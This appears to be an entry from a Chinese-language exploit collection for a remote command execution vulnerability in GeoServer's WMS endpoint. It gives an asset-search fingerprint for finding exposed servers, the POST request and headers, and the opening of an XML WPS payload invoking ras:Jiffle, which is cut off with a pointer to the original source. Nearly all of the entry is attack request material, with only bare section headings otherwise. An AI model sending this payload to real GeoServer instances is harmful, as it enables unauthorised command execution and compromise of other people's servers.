# geoserverwms存在远程命令执行漏洞

- **系统**：GeoServer　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="GeoServer"`
- **请求**：`POST /geoserver/wms HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 1792`　`Content-Type: application/xml`　`SL-CE-SUID: 3`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">
<ows:Identifier>ras:Jiffle<…（脚本共 1811 字，完整版见原文）
```

**其他**
- geoserver wms存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * GeoServer